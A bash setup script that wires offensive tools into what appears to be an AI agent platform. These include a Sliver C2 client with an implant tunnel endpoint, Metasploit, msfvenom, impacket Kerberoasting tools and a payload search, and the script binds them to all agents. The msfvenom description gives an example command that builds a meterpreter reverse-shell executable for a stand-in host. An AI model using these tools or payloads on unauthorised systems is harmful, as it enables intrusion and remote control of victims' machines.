#!/bin/bash
# Add the Sliver/payload tools to the ARTEX DB, fix the two Metasploit rows,
# and bind every custom tool whose binary is present in the running container
# to all agents. Safe to re-run.
set -euo pipefail

PSQL=(docker exec -i artex-global-postgres-1 psql -U artex -d artex -At -F $'\t')
CONTAINER=artex-global-artex-1
q() { "${PSQL[@]}" -c "$1"; }

AGENTS_JSON=$(q "select coalesce(jsonb_agg(key order by key),'[]'::jsonb)::text from agents;")
echo "Agents: $AGENTS_JSON"

"${PSQL[@]}" >/dev/null <<'SQL'
BEGIN;
INSERT INTO tools (key, system, description, schema, agents, enabled, kind, exec)
VALUES
 ('sliver', false, 'Sliver C2 client. Runs Sliver console commands against the local server: sessions, use <id>, generate ..., jobs, mtls, etc. Put several commands on separate lines; session selection only lasts for that call.', '{"type":"object","required":["args"],"properties":{"args":{"type":"string","description":"One or more Sliver console commands, separated by newlines"}}}', '[]'::jsonb, true, 'command', '{"command":"sliver-cmd {args}"}'),
 ('sliver_sessions', false, 'List active Sliver C2 sessions and beacons.', '{"type":"object","properties":{}}', '[]'::jsonb, true, 'command', '{"command":"sliver-cmd sessions"}'),
 ('sliver_endpoint', false, 'Show the current Cloudflare quick-tunnel domain for Sliver implants.', '{"type":"object","properties":{}}', '[]'::jsonb, true, 'command', '{"command":"cat /app/data/sliver/endpoint.txt"}'),
 ('payload_search', false, 'Search PayloadsAllTheThings, SecLists payloads and ExploitDB for a term.', '{"type":"object","required":["args"],"properties":{"args":{"type":"string","description":"Search term"}}}', '[]'::jsonb, true, 'command', '{"command":"payload-search {args}"}')
ON CONFLICT (key) DO UPDATE SET
  description=EXCLUDED.description, schema=EXCLUDED.schema, exec=EXCLUDED.exec,
  kind=EXCLUDED.kind, enabled=true, system=false;

UPDATE tools SET
  kind='command',
  schema='{"type":"object","required":["args"],"properties":{"args":{"type":"string","description":"msfconsole command, e.g. search smb"}}}'::jsonb,
  exec='{"command":"msf-run {args}"}'::jsonb
WHERE key='msfconsole';

UPDATE tools SET
  kind='command',
  schema='{"type":"object","required":["args"],"properties":{"args":{"type":"string","description":"msfvenom arguments, e.g. -p windows/x64/meterpreter/reverse_tcp LHOST=1.2.3.4 LPORT=4444 -f exe -o /tmp/x.exe"}}}'::jsonb,
  exec='{"command":"artex-run msfvenom {args}"}'::jsonb
WHERE key='msfvenom';

-- These three shipped commands point at broken/missing PATH entries.
UPDATE tools SET exec='{"command":"/opt/exploit/bin/GetUserSPNs.py {args}"}'::jsonb WHERE key='impacket_getspn';
UPDATE tools SET exec='{"command":"/opt/exploit/bin/getST.py {args}"}'::jsonb WHERE key='impacket_getst';
UPDATE tools SET exec='{"command":"/opt/bbot/bin/wafw00f {args}"}'::jsonb WHERE key='wafw00f';
COMMIT;
SQL

# Existing exec values are sealed at rest, so use the original key->binary map
# for the pre-existing tools and an explicit map for the tools added above.
declare -A binmap
if [ -f /tmp/opencode/customtools.tsv ]; then
    while IFS=$'\t' read -r key _kind bin _args; do
        [ -n "$bin" ] && binmap["$key"]="$bin"
    done < /tmp/opencode/customtools.tsv
fi
binmap[sliver]=sliver-cmd
binmap[sliver_sessions]=sliver-cmd
binmap[sliver_endpoint]=cat
binmap[payload_search]=payload-search
binmap[msfconsole]=msf-run
binmap[msfvenom]=msfvenom
binmap[impacket_getspn]=/opt/exploit/bin/GetUserSPNs.py
binmap[impacket_getst]=/opt/exploit/bin/getST.py
binmap[wafw00f]=/opt/bbot/bin/wafw00f

installed=()
while IFS=$'\t' read -r key cmd; do
    [ -n "$key" ] || continue
    bin="${binmap[$key]:-}"
    if [ -z "$bin" ]; then
        bin=$(printf '%s\n' "$cmd" | awk '{print $1}')
    fi
    [ -n "$bin" ] || continue
    if docker exec "$CONTAINER" sh -c "command -v \"$bin\"" >/dev/null 2>&1; then
        installed+=("$key")
    else
        echo "SKIP (binary missing): $key -> $bin"
    fi
done < <(q "select key, coalesce(exec->>'command','') from tools where not system order by key;")

if [ ${#installed[@]} -eq 0 ]; then
    echo "No installable tools found; nothing bound." >&2
    exit 1
fi

keys_sql=$(printf "'%s'," "${installed[@]}")
keys_sql=${keys_sql%,}
"${PSQL[@]}" >/dev/null <<SQL
UPDATE tools SET agents = '${AGENTS_JSON}'::jsonb WHERE key IN (${keys_sql});
SQL
echo "Bound ${#installed[@]} tools to all agents."
q "select count(*) from tools where not system and jsonb_typeof(agents)='array' and jsonb_array_length(agents) > 0;"
